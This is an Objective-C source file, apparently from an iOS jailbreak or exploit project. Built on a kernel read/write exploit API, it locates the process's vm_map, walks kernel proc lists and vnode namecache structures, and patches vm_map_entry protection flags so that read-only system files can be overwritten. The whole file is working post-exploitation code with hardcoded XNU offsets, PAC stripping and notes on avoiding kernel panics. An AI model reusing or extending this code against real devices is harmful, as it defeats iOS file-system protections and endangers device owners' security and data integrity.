//
//  kfs.m — kernel-memory file access from rooootdev/lara
//  Completely standalone; only uses the public exploit API.
//  No sandbox escape, no credential patching, no PPL writes.
//
//  File overwrite via vm_map entry protection patching
//  (opa334/htrowii technique from WDBFontOverwrite)
//
//  BUG 2 FIX: vm_map offset discovery via scan (not hardcoded task+0x28)
//  BUG 3 FIX: get_our_task() uses proc_ro→task path
//

#include "kfs.h"
#include "darksword_core.h"
#include "utils.h"
#include "filelog.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach-o/loader.h>

#define kr64(a)       ds_kread64(a)
#define kw64(a,v)     ds_kwrite64(a,v)
#define kr32(a)       ds_kread32(a)
#define krd(a,b,s)    ds_kread(a,b,s)
#define kwr(a,b,s)    ds_kwrite(a,b,s)
#define KBASE         ds_get_kernel_base()
#define KSLIDE        ds_get_kernel_slide()
#define PAGE_SZ       0x4000ULL

/* ================================================================
   Pointer validation
   ================================================================ */

static inline bool is_kptr(uint64_t p) {
    if (p == 0) return false;
    /* All callers pass PAC-stripped values (via kreadptr = pac_strip(kr64(...))).
     * After stripping, canonical kernel pointers have top 16 bits = all 1s. */
    return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

static inline bool is_heap_ptr(uint64_t p) {
    /* Use dynamic zone map bounds if available (same as utils.m).
     * Zone metadata/bitmaps are OUTSIDE the zone map and may be on
     * unmapped pages — reading them causes kernel data abort. */
    if (p >= 0xfffffff000000000ULL) return false;
    uint64_t zmin = ds_get_zone_map_min();
    uint64_t zmax = ds_get_zone_map_max();
    if (zmin && zmax) {
        return (p >= zmin && p < zmax);
    }
    /* Fallback: broad static ranges (PAC-tagged and PAC-stripped) */
    return (p >= 0xfffffe0000000000ULL && p <= 0xfffffeFFFFFFFFFFULL) ||
           (p >= 0xffffff8000000000ULL && p < 0xfffffff000000000ULL);
}

/* ================================================================
   Logging
   ================================================================ */

static kfs_log_callback_t g_log = NULL;
void kfs_set_log_callback(kfs_log_callback_t cb) { g_log = cb; }
static void klog(const char *fmt, ...) __attribute__((format(printf,1,2)));
static void klog(const char *fmt, ...) {
    char buf[1024]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    fprintf(stderr, "(kfs) %s\n", buf);
    filelog_write("[kfs] %s", buf);
    if (g_log) g_log(buf);
}

/* ================================================================
   State
   ================================================================ */

static bool g_ready = false;
static uint64_t g_rootvnode = 0;
static uint64_t g_heap_prefix = 0xFFFFFE0000000000ULL;

/* ================================================================
   Vnode offsets — verified against XNU xnu-10002.1.13 source
   (matches iOS 17.3.1 / 18.x — struct vnode is stable)

   struct vnode layout (arm64, lck_mtx_t = 16 bytes):
     +0x00: v_lock          (lck_mtx_t, 16B)
     +0x10: v_freelist      (TAILQ_ENTRY, 16B)
     +0x20: v_mntvnodes     (TAILQ_ENTRY, 16B)
     +0x30: v_ncchildren    (TAILQ_HEAD, 16B)
     +0x40: v_nclinks       (LIST_HEAD, 8B)
     +0x48: v_defer_reclaimlist (8B)
     +0x50: v_listflag      (4B)
     +0x54: v_flag           (4B)
     +0x58: v_lflag          (2B)
     +0x5A: v_iterblkflags   (1B)
     +0x5B: v_references     (1B)
     +0x5C: v_kusecount      (4B)
     +0x60: v_usecount       (4B)
     +0x64: v_iocount        (4B)
     +0x68: v_owner          (8B, PAC)
     +0x70: v_type           (uint16_t!)  ← was 0x71 (high byte=always 0!)
     +0x72: v_tag            (uint16_t)
     +0x74: v_id             (uint32_t)
     +0x78: v_un (vu_ubcinfo)(8B)
     ...
     +0xB8: v_name           (8B)
     +0xC0: v_parent         (8B, PAC)
     +0xD8: v_mount          (8B, PAC)
   ================================================================ */

#define OV_NCCHILDREN  0x30
#define OV_TYPE        0x70  /* FIX: was 0x71 — that read the HIGH byte of uint16_t v_type,
                              * which is ALWAYS 0 for standard vnode types (VREG=1..VFIFO=7).
                              * This caused rootvnode discovery to ALWAYS FAIL
                              * because (uint8_t)kr32(vn+0x71) == 0, never == VDIR(2). */
#define OV_UBCINFO     0x78
#define OV_NAME        0xB8
#define OV_PARENT      0xC0
#define OV_MOUNT       0xD8

/* PID offset: use dynamic value from utils.m (0x60 on iOS 17+, 0x10 legacy)
 * Verified against xnu-10002 struct proc layout. */

/* Namecache offsets — nc_child.tqe_next for child-list walk.
 * v_ncchildren is a TAILQ linked through nc_child (at +0x10 in namecache),
 * NOT nc_entry (at +0x00, which is the global "all entries" chain).
 *
 * struct namecache (xnu-10002):
 *   +0x00: nc_entry   (TAILQ_ENTRY, 16B) — global chain
 *   +0x10: nc_child   (TAILQ_ENTRY, 16B) — per-parent chain ← USE THIS
 *   +0x20: nc_un      (union, 16B)
 *   +0x30: nc_hash    (smrq_link, 8B in source; may be 16B in compiled kernel)
 *   +0x38/0x40: nc_vid, nc_counter
 *   +0x40/0x48: nc_dvp
 *   +0x48/0x50: nc_vp    (8B) — target vnode
 *   +0x50/0x58: nc_hashval (4B) + pad
 *   +0x58/0x60: nc_name  (8B) — string pointer
 *
 * The smrq_link size varies between iOS versions:
 *   iOS 17 (xnu-10002, source): 8 bytes → nc_vp=0x48, nc_name=0x58
 *   iOS 18 (xnu-11215, IDA):    16 bytes → nc_vp=0x50, nc_name=0x60
 * We auto-detect at runtime in verify_ncache().
 */
#define ONC_CHILD_NEXT 0x10  /* FIX: was 0x00 (nc_entry.tqe_next = wrong chain!) */

/* Defaults for namecache data offsets (auto-calibrated in verify_ncache) */
static uint32_t g_onc_vp   = 0x48;  /* iOS 17 default (smrq_link=8B) */
static uint32_t g_onc_name = 0x58;  /* iOS 17 default (smrq_link=8B) */

/* ================================================================
   vm_map entry patching offsets
   ================================================================ */

#define O_PROC_RO         0x18
#define O_PROC_RO_TASK    0x08
#define O_VM_MAP_HDR      0x10
#define O_HDR_FIRST       0x08
#define O_HDR_NENTRIES    0x20
#define O_ENTRY_NEXT      0x08
#define O_ENTRY_START     0x10
#define O_ENTRY_END       0x18
#define O_ENTRY_FLAGS     0x48

#define FLAGS_PROT_SHIFT    7
#define FLAGS_MAXPROT_SHIFT 11
#define FLAGS_PROT_MASK     0x780
#define FLAGS_MAXPROT_MASK  0x7800

#define T1SZ_BOOT 0x19
#define BIT(b)    (1ULL << (b))
#define ONES(x)   (BIT(x)-1)
#define PTR_MASK  ONES(64-T1SZ_BOOT)
#define PAC_MASK_ (~PTR_MASK)
#define SIGN(p)   ((p) & BIT(55))

static inline uint64_t pac_strip(uint64_t p) {
    return SIGN(p) ? (p | PAC_MASK_) : (p & ~PAC_MASK_);
}

uint64_t kreadptr(uint64_t addr) {
    return pac_strip(kr64(addr));
}

static uint64_t g_launchd_proc = 0;
static uint64_t g_our_proc = 0;

/* ================================================================
   get_our_task — BUG 3 FIX: tries proc_ro→task first
   ================================================================ */

static uint64_t get_our_task(void) {
    uint64_t task = ds_get_our_task();
    if (is_heap_ptr(task)) {
        klog("task (from exploit): 0x%llx", task);
        return task;
    }

    uint64_t proc = ds_get_our_proc();
    if (!is_heap_ptr(proc) && is_heap_ptr(g_our_proc)) {
        proc = g_our_proc;
    }
    if (!is_heap_ptr(proc)) {
        proc = ourproc();
    }
    if (!is_heap_ptr(proc)) {
        klog("no proc/task available");
        return 0;
    }

    task = ourtask(proc);
    if (is_heap_ptr(task)) {
        klog("task (via utils): 0x%llx", task);
        return task;
    }

    uint64_t proc_ro = kreadptr(proc + O_PROC_RO);
    if (!is_heap_ptr(proc_ro)) { klog("bad proc_ro"); return 0; }
    task = kreadptr(proc_ro + O_PROC_RO_TASK);
    if (!is_heap_ptr(task)) { klog("bad task"); return 0; }
    klog("task (computed): 0x%llx", task);
    return task;
}

/* ================================================================
   find_vm_map_entry — walk vm_map for a given user address
   BUG 2 FIX: nentries validated before walking
   ================================================================ */

static uint64_t find_vm_map_entry(uint64_t vm_map, uint64_t uaddr) {
    uint64_t header = vm_map + O_VM_MAP_HDR;
    uint64_t entry  = pac_strip(kr64(header + O_HDR_FIRST));
    uint32_t nentries = kr32(header + O_HDR_NENTRIES);
    klog("vm_map entries: %u, looking for 0x%llx", nentries, uaddr);

    for (uint32_t i = 0; i < nentries && is_heap_ptr(entry); i++) {
        uint64_t start = kr64(entry + O_ENTRY_START);
        uint64_t end   = kr64(entry + O_ENTRY_END);
        if (uaddr >= start && uaddr < end) {
            klog("found entry 0x%llx: 0x%llx-0x%llx", entry, start, end);
            return entry;
        }
        entry = pac_strip(kr64(entry + O_ENTRY_NEXT));
    }
    klog("vm_map_entry not found for 0x%llx", uaddr);
    return 0;
}

/* ================================================================
   patch_entry_prot — change vm_map_entry protection flags
   ================================================================ */

#define ENTRY_SAFE_BASE   0x30
#define FLAGS_OFF_IN_BUF  (O_ENTRY_FLAGS - ENTRY_SAFE_BASE)

static void patch_entry_prot(uint64_t entry, int prot, int maxprot) {
    uint8_t buf[0x20];
    krd(entry + ENTRY_SAFE_BASE, buf, 0x20);

    uint64_t flags = *(uint64_t *)(buf + FLAGS_OFF_IN_BUF);
    uint64_t new_flags = flags;
    new_flags = (new_flags & ~FLAGS_PROT_MASK)    | ((uint64_t)prot    << FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~FLAGS_MAXPROT_MASK) | ((uint64_t)maxprot << FLAGS_MAXPROT_SHIFT);
    if (new_flags != flags) {
        klog("patching entry flags: 0x%llx → 0x%llx", flags, new_flags);
        *(uint64_t *)(buf + FLAGS_OFF_IN_BUF) = new_flags;
        kwr(entry + ENTRY_SAFE_BASE, buf, 0x20);
    }
}

/* ================================================================
   kfs_overwrite_file — the main file overwrite primitive
   Uses mmap + vm_map entry patching
   ================================================================ */

int kfs_overwrite_file(const char *to, const char *from) {
    if (!g_ready) { klog("kfs not ready"); return -1; }

    if (!to || to[0] == 0 || !from || from[0] == 0) {
        klog("overwrite invalid path(s): to=%s from=%s",
             to ? to : "(null)", from ? from : "(null)");
        return -1;
    }

    klog("overwrite: %s ← %s", to, from);

    int to_fd = open(to, O_RDONLY);
    if (to_fd < 0) { klog("can't open target: %s", strerror(errno)); return -1; }
    off_t to_size = lseek(to_fd, 0, SEEK_END);
    if (to_size < 0) {
        klog("target size query failed: %s", strerror(errno));
        close(to_fd);
        return -1;
    }

    int from_fd = open(from, O_RDONLY);
    if (from_fd < 0) { klog("can't open source: %s", strerror(errno)); close(to_fd); return -1; }
    off_t from_size = lseek(from_fd, 0, SEEK_END);
    if (from_size < 0) {
        klog("source size query failed: %s", strerror(errno));
        close(from_fd); close(to_fd);
        return -1;
    }

    if (to_size < from_size) {
        klog("source (%lld) > target (%lld)", from_size, to_size);
        close(from_fd); close(to_fd);
        return -1;
    }

    char *to_data = mmap(NULL, to_size, PROT_READ, MAP_SHARED, to_fd, 0);
    if (to_data == MAP_FAILED) {
        klog("mmap target failed: %s", strerror(errno));
        close(from_fd); close(to_fd);
        return -1;
    }
    klog("target mmap'd at %p (size %lld)", to_data, to_size);

    uint64_t task = get_our_task();
    if (!task) { munmap(to_data, to_size); close(from_fd); close(to_fd); return -1; }

    /* BUG 2 FIX: Scan task struct for vm_map instead of hardcoded task+0x28 */
    uint64_t vm_map = 0;
    for (int off = 0x20; off <= 0x300; off += 8) {
        uint64_t candidate = pac_strip(kr64(task + off));
        if (!is_heap_ptr(candidate)) continue;
        uint32_t ne = kr32(candidate + O_VM_MAP_HDR + O_HDR_NENTRIES);
        if (ne > 0 && ne < 100000) {
            vm_map = candidate;
            klog("vm_map: 0x%llx (task+0x%x, nentries=%u)", vm_map, off, ne);
            break;
        }
    }

    if (!vm_map) {
        /* Fallback: try the original task+0x28 */
        vm_map = pac_strip(kr64(task + 0x28));
        if (!is_heap_ptr(vm_map)) {
            klog("vm_map not found!");
            munmap(to_data, to_size); close(from_fd); close(to_fd);
            return -1;
        }
        klog("vm_map: 0x%llx (task+0x28 fallback)", vm_map);
    }

    uint64_t entry = find_vm_map_entry(vm_map, (uint64_t)to_data);
    if (!entry) {
        munmap(to_data, to_size); close(from_fd); close(to_fd);
        return -1;
    }
    patch_entry_prot(entry, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);

    char *from_data = mmap(NULL, from_size, PROT_READ, MAP_PRIVATE, from_fd, 0);
    if (from_data == MAP_FAILED) {
        klog("mmap source failed");
        munmap(to_data, to_size); close(from_fd); close(to_fd);
        return -1;
    }
    klog("writing %lld bytes...", from_size);
    memcpy(to_data, from_data, from_size);
    if (to_size > from_size) {
        memset((uint8_t *)to_data + from_size, 0, to_size - from_size);
        klog("zeroed %llu bytes of trailing garbage", to_size - from_size);
    }
    klog("overwrite done!");

    munmap(from_data, from_size);
    munmap(to_data, to_size);
    close(from_fd);
    close(to_fd);
    return 0;
}

int kfs_overwrite_file_bytes(const char *path, off_t offset, const void *data, size_t len) {
    if (!g_ready) return -1;

    if (!path || path[0] == 0) {
        klog("kfs_overwrite_file_bytes invalid path");
        return -1;
    }
    if (offset < 0) {
        klog("kfs_overwrite_file_bytes negative offset: %lld", offset);
        return -1;
    }
    if (!data && len != 0) {
        klog("kfs_overwrite_file_bytes NULL data with len=%zu", len);
        return -1;
    }

    int fd = open(path, O_RDONLY);
    if (fd < 0) { klog("can't open: %s", strerror(errno)); return -1; }
    off_t file_size = lseek(fd, 0, SEEK_END);
    if (file_size < 0) {
        klog("file size query failed: %s", strerror(errno));
        close(fd);
        return -1;
    }
    if ((uint64_t)offset > (uint64_t)file_size ||
        len > (size_t)((uint64_t)file_size - (uint64_t)offset)) {
        klog("offset+len beyond file size");
        close(fd); return -1;
    }
    if (len == 0) {
        klog("zero-length overwrite is a no-op");
        close(fd);
        return 0;
    }

    char *mapped = mmap(NULL, file_size, PROT_READ, MAP_SHARED, fd, 0);
    if (mapped == MAP_FAILED) { close(fd); return -1; }

    uint64_t task = get_our_task();
    if (!task) { munmap(mapped, file_size); close(fd); return -1; }

    /* BUG 2 FIX: dynamic vm_map scan */
    uint64_t vm_map = 0;
    for (int off2 = 0x20; off2 <= 0x300; off2 += 8) {
        uint64_t candidate = pac_strip(kr64(task + off2));
        if (!is_heap_ptr(candidate)) continue;
        uint32_t ne = kr32(candidate + 0x10 + 0x20);
        if (ne > 0 && ne < 100000) { vm_map = candidate; break; }
    }
    if (!vm_map) { munmap(mapped, file_size); close(fd); return -1; }

    uint64_t entry = find_vm_map_entry(vm_map, (uint64_t)mapped);
    if (!entry) { munmap(mapped, file_size); close(fd); return -1; }
    patch_entry_prot(entry, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);

    memcpy(mapped + offset, data, len);
    klog("wrote %zu bytes at offset %lld", len, offset);

    munmap(mapped, file_size);
    close(fd);
    return 0;
}

/* ================================================================
   Proc list walking for rootvnode discovery
   ================================================================ */

static uint64_t walk_proclist_for_pid_dir(uint64_t first, pid_t target, int dir) {
    if (!PROC_PID_OFFSET) init_offsets();  /* Ensure offsets are ready */
    uint64_t cur = first;
    for (int step = 0; step < 2000 && is_heap_ptr(cur); step++) {
        int32_t pid = (int32_t)kr32(cur + PROC_PID_OFFSET);
        if (pid == target) return cur;
        uint64_t next = kr64(cur + dir);
        if (!is_heap_ptr(next) || next == first || next == cur) break;
        cur = next;
    }
    return 0;
}

static void walk_proclist_collect(uint64_t first, int dir, pid_t my_pid) {
    if (!PROC_PID_OFFSET) init_offsets();
    uint64_t cur = first;
    for (int step = 0; step < 2000 && is_heap_ptr(cur); step++) {
        int32_t pid = (int32_t)kr32(cur + PROC_PID_OFFSET);
        if (pid == 1 && !g_launchd_proc) g_launchd_proc = cur;
        if (pid == my_pid && !g_our_proc) g_our_proc = cur;
        if (g_launchd_proc && g_our_proc) return;
        uint64_t next = kr64(cur + dir);
        if (!is_heap_ptr(next) || next == first || next == cur) break;
        cur = next;
    }
}

static int find_procs(void) {
    g_our_proc = ds_get_our_proc();
    if (!is_heap_ptr(g_our_proc)) {
        klog("ds_get_our_proc() failed");
        g_our_proc = ourproc();
    } else {
        klog("our proc: 0x%llx", g_our_proc);
    }

    if (is_heap_ptr(g_our_proc)) {
        klog("our proc (recovered): 0x%llx", g_our_proc);
    }

    /* Bug #412: once exploit already returned a validated self proc/task and
     * KRW is up, avoid re-entering procbyname()->kernprocaddress()->allproc
     * discovery from kfs_init(). Fresh runtime 2026-04-04 10:39:57 showed
     * this second allproc pass immediately after "Kernel R/W achieved!",
     * followed by early_kread failures and a later proc_task zone panic.
     * launchd has a stable PID (1), so prefer a bounded PID walk from our
     * known proc and only use procbyname() as a last resort. */
    if (is_heap_ptr(g_our_proc)) {
        klog("resolving launchd via PID-based proc walk from known self proc");
        g_launchd_proc = walk_proclist_for_pid_dir(g_our_proc, 1, 0x08);
        if (!is_heap_ptr(g_launchd_proc)) {
            g_launchd_proc = walk_proclist_for_pid_dir(g_our_proc, 1, 0x00);
        }
    }

    if (!is_heap_ptr(g_launchd_proc)) {
        g_launchd_proc = procbyname("launchd");
        if (!is_heap_ptr(g_launchd_proc)) {
            klog("procbyname(\"launchd\") failed");
            return -1;
        }
    }

    klog("launchd proc: 0x%llx", g_launchd_proc);
    return 0;
}

/* ================================================================
   Rootvnode discovery via launchd p_textvp → v_parent chain
   / ← v_parent ← /sbin ← v_parent ← /sbin/launchd (p_textvp)
   ================================================================ */

static int find_rootvnode(void) {
    if (find_procs() != 0) return -1;

    klog("scanning launchd proc for p_textvp...");

    uint8_t proc_buf[0x800];
    krd(g_launchd_proc,         proc_buf,         0x200);
    krd(g_launchd_proc + 0x200, proc_buf + 0x200, 0x200);
    krd(g_launchd_proc + 0x400, proc_buf + 0x400, 0x200);
    krd(g_launchd_proc + 0x600, proc_buf + 0x600, 0x200);

    for (int toff = 0x80; toff < 0x800; toff += 8) {
        uint64_t textvp = pac_strip(*(uint64_t *)(proc_buf + toff));
        if (!is_heap_ptr(textvp)) continue;

        uint64_t name_ptr = kreadptr(textvp + OV_NAME);
        if (!is_kptr(name_ptr)) continue;

        char nm[32];
        krd(name_ptr, nm, 31); nm[31] = 0;

        if (strcmp(nm, "launchd") != 0) continue;

        klog("textvp=0x%llx at proc+0x%x (name='%s')", textvp, toff, nm);

        uint64_t sbin_vn = kreadptr(textvp + OV_PARENT);
        if (!is_heap_ptr(sbin_vn)) continue;
        uint64_t sbin_name = kreadptr(sbin_vn + OV_NAME);
        if (!is_kptr(sbin_name)) continue;
        char snm[16]; krd(sbin_name, snm, 8); snm[8] = 0;
        if (strcmp(snm, "sbin") != 0) continue;
        klog("/sbin vnode=0x%llx", sbin_vn);

        uint64_t root_vn = kreadptr(sbin_vn + OV_PARENT);
        if (!is_heap_ptr(root_vn)) continue;

        /*
         * BUG #208 FIX: Root vnode v_name is NULL in XNU — the root
         * filesystem vnode has no parent path component, so v_name is
         * never set (it remains NULL after vnode_create).
         * Previously: `if (!is_kptr(root_name)) continue;` skipped the
         * actual root vnode every time, leaving g_rootvnode == 0.
         * Fix: skip the v_name check entirely for the root vnode candidate.
         * We already validated the chain: textvp.name=="launchd",
         * textvp.parent.name=="sbin", textvp.parent.parent = root_vn.
         * Just verify v_type == VDIR (2) as a sanity check.
         */
        uint64_t root_name = kreadptr(root_vn + OV_NAME);
        if (root_name != 0 && is_kptr(root_name)) {
            /* Some XNU builds do set v_name for the root vnode; accept "/" or "" */
            char rnm[4]; krd(root_name, rnm, 2); rnm[2] = 0;
            if (rnm[0] != 0 && rnm[0] != '/') {
                klog("root v_name='%s' unexpected, skipping", rnm);
                continue;
            }
        }
        /* root_name == 0 (NULL) is the normal XNU case — proceed */

        uint16_t vtype = (uint16_t)kr32(root_vn + OV_TYPE);
        if (vtype != 2) { klog("root v_type=%d (expected VDIR=2)", vtype); continue; }

        g_rootvnode = root_vn;
        klog("rootvnode: 0x%llx (v_name=%s)", root_vn, root_name == 0 ? "NULL(OK)" : "valid");
        return 0;
    }

    klog("rootvnode not found via launchd (scanned proc+0x80 to proc+0x800)");
    return -1;
}

/* ================================================================
   Namecache-based directory listing
   ================================================================ */

static bool g_ncache_ok = false;

static int verify_ncache(void) {
    struct stat st;
    stat("/var", &st); stat("/private", &st); stat("/System", &st);
    stat("/usr", &st); stat("/sbin", &st); stat("/tmp", &st);

    uint64_t first_nc = kreadptr(g_rootvnode + OV_NCCHILDREN);
    if (!is_heap_ptr(first_nc)) {
        klog("v_ncchildren empty (got 0x%llx)", first_nc);
        return -1;
    }

    /* Auto-detect namecache field offsets.
     * smrq_link size differs between iOS versions:
     *   iOS 17 (xnu-10002): 8 bytes  → nc_vp=0x48, nc_name=0x58
     *   iOS 18 (xnu-11215): 16 bytes → nc_vp=0x50, nc_name=0x60
     * Try iOS 17 offsets first (our target), fallback to iOS 18. */
    static const uint32_t nc_vp_candidates[]   = { 0x48, 0x50 };
    static const uint32_t nc_name_candidates[] = { 0x58, 0x60 };
    bool calibrated = false;
    for (int ci = 0; ci < 2 && !calibrated; ci++) {
        uint64_t nc_vp = kreadptr(first_nc + nc_vp_candidates[ci]);
        uint64_t nc_nm = kreadptr(first_nc + nc_name_candidates[ci]);
        if (is_heap_ptr(nc_vp) && is_kptr(nc_nm)) {
            char probe[8];
            krd(nc_nm, probe, 7); probe[7] = 0;
            if (probe[0] >= '!' && probe[0] <= '~') { /* printable ASCII = valid name */
                g_onc_vp   = nc_vp_candidates[ci];
                g_onc_name = nc_name_candidates[ci];
                calibrated = true;
                klog("ncache calibrated: nc_vp=+0x%x nc_name=+0x%x (set %d)",
                     g_onc_vp, g_onc_name, ci);
            }
        }
    }
    if (!calibrated) {
        klog("ncache offsets mismatch (tried both iOS 17 and 18 layouts)");
        return -1;
    }

    uint64_t nc_nm = kreadptr(first_nc + g_onc_name);
    char nm[32];
    krd(nc_nm, nm, 31); nm[31] = 0;
    klog("ncache OK: first child='%s'", nm);
    g_ncache_ok = true;
    return 0;
}

static uint64_t nc_lookup_child(uint64_t dir_vn, const char *comp) {
    uint64_t nc = kreadptr(dir_vn + OV_NCCHILDREN);
    for (int i = 0; i < 10000 && is_heap_ptr(nc); i++) {
        uint64_t nm_ptr = kreadptr(nc + g_onc_name);
        if (is_kptr(nm_ptr)) {
            char nm[256]; krd(nm_ptr, nm, 255); nm[255] = 0;
            if (strcmp(nm, comp) == 0) {
                uint64_t vp = kreadptr(nc + g_onc_vp);
                return is_heap_ptr(vp) ? vp : 0;
            }
        }
        nc = kreadptr(nc + ONC_CHILD_NEXT); /* nc_child.tqe_next */
        if (!is_heap_ptr(nc)) break;
    }
    return 0;
}

static uint64_t resolve_path(const char *path) {
    if (!path || path[0] != '/') return 0;
    if (strlen(path) >= sizeof(((char[1024]){0}))) {
        klog("resolve_path path too long: %s", path);
        return 0;
    }

    struct stat st;
    stat(path, &st);
    char tmp[1024];
    strncpy(tmp, path, sizeof(tmp)-1); tmp[sizeof(tmp)-1] = 0;
    for (size_t i = strlen(tmp); i > 1; i--)
        if (tmp[i] == '/') { tmp[i] = 0; stat(tmp, &st); tmp[i] = '/'; }

    if (strcmp(path, "/") == 0) return g_rootvnode;

    char pb[1024]; strncpy(pb, path, sizeof(pb)-1); pb[sizeof(pb)-1] = 0;
    uint64_t cur = g_rootvnode;
    char *sv = NULL, *c = strtok_r(pb, "/", &sv);
    while (c && *c) {
        uint64_t ch = nc_lookup_child(cur, c);
        if (!is_heap_ptr(ch)) { klog("'%s' not in ncache", c); return 0; }
        cur = ch;
        c = strtok_r(NULL, "/", &sv);
    }
    return cur;
}

static int64_t vnode_file_size(uint64_t vn) {
    uint64_t ubc = kreadptr(vn + OV_UBCINFO);
    if (!is_heap_ptr(ubc)) return -1;

    for (int off = 0x08; off <= 0x18; off += 8) {
        int64_t sz = (int64_t)kr64(ubc + off);
        if (sz > 0 && sz < 10LL * 1024 * 1024 * 1024) return sz;
    }
    return -1;
}

/* ================================================================
   Public API
   ================================================================ */

bool kfs_is_ready(void) { return g_ready; }

int kfs_init(void) {
    klog("kfs_init starting...");

    /* Reset all derived state on every init.
     * Otherwise a previous successful run can leave stale rootvnode/ncache
     * pointers behind, and a later failed init would still appear ready. */
    g_ready = false;
    g_ncache_ok = false;
    g_rootvnode = 0;
    g_launchd_proc = 0;
    g_our_proc = 0;

    uint64_t proc = ds_get_our_proc();
    uint64_t task = ds_get_our_task();
    if (proc) {
        g_heap_prefix = proc & 0xFFFFFF0000000000ULL;
        klog("Extracted heap PAC prefix: 0x%llx", g_heap_prefix);
    }

    if (is_heap_ptr(proc) && is_heap_ptr(task)) {
        g_our_proc = proc;
        klog("proc=0x%llx task=0x%llx (from exploit)", proc, task);
        g_ready = true;
        klog("file overwrite ready!");
    } else {
        klog("exploit didn't find proc/task, trying kfs scan...");
        if (find_procs() == 0 && is_heap_ptr(g_our_proc)) {
            g_ready = true;
            klog("file overwrite ready (via kfs scan)");
        } else {
            klog("proc not found — file overwrite won't work");
        }
    }

    if (g_ready) {
        if (find_rootvnode() == 0) {
            if (verify_ncache() != 0) {
                klog("ncache verification failed");
            }
        } else {
            klog("rootvnode discovery failed; listdir will be unavailable");
        }
    }

    klog("kfs_init done (ready=%d)", g_ready);
    return g_ready ? 0 : -1;
}

int kfs_listdir(const char *path, kfs_entry_t **out, int *count) {
    if (!out || !count) {
        klog("kfs_listdir invalid outputs (out=%p count=%p)", out, count);
        return -1;
    }
    *out = NULL;
    *count = 0;

    if (!g_ready || !g_ncache_ok) {
        klog("kfs_listdir not ready (ready=%d ncache=%d)", g_ready, g_ncache_ok);
        return -1;
    }
    uint64_t dvn = resolve_path(path);
    if (!is_heap_ptr(dvn)) { klog("resolve_path failed: %s", path ? path : "(null)"); return -1; }
    uint16_t vtype = (uint16_t)kr32(dvn + OV_TYPE);
    if (vtype != 2) { klog("not dir: %s vtype=%u", path, vtype); return -1; }

    int cap = 64, n = 0;
    kfs_entry_t *ents = calloc(cap, sizeof(kfs_entry_t));
    if (!ents) {
        klog("kfs_listdir allocation failed");
        return -1;
    }

    uint64_t nc = kreadptr(dvn + OV_NCCHILDREN);
    for (int i = 0; i < 10000 && is_heap_ptr(nc); i++) {
        uint64_t nm_ptr = kreadptr(nc + g_onc_name);
        uint64_t vp     = kreadptr(nc + g_onc_vp);
        if (is_kptr(nm_ptr) && is_heap_ptr(vp)) {
            char nm[256]; krd(nm_ptr, nm, 255); nm[255] = 0;
            if (nm[0] && strcmp(nm, ".") != 0 && strcmp(nm, "..") != 0) {
                if (n >= cap) { cap *= 2; kfs_entry_t *tmp = realloc(ents, cap * sizeof(kfs_entry_t)); if (!tmp) { free(ents); *out = NULL; *count = 0; return -1; } ents = tmp; }
                strncpy(ents[n].name, nm, 255);
                ents[n].name[255] = 0;
                uint16_t vt = (uint16_t)kr32(vp + OV_TYPE);
                switch (vt) {
                    case 2: ents[n].d_type = 4;  break; /* VDIR */
                    case 1: ents[n].d_type = 8;  break; /* VREG */
                    case 5: ents[n].d_type = 10; break; /* VLNK */
                    default: ents[n].d_type = 0; break;
                }
                n++;
            }
        }
        nc = kreadptr(nc + ONC_CHILD_NEXT); /* nc_child.tqe_next */
    }
    *out = ents; *count = n;
    klog("kfs_listdir ok path=%s count=%d", path, n);
    return 0;
}

void kfs_free_listing(kfs_entry_t *e) { free(e); }

int64_t kfs_file_size(const char *path) {
    if (!g_ready) return -1;
    uint64_t vn = resolve_path(path);
    if (!is_heap_ptr(vn)) return -1;
    return vnode_file_size(vn);
}

int64_t kfs_read(const char *path, void *buf, size_t size, off_t offset) {
    (void)path; (void)buf; (void)size; (void)offset;
    klog("kfs_read not yet implemented");
    return -1;
}

int64_t kfs_write(const char *path, const void *buf, size_t size, off_t offset) {
    (void)path; (void)buf; (void)size; (void)offset;
    klog("kfs_write not yet implemented");
    return -1;
}
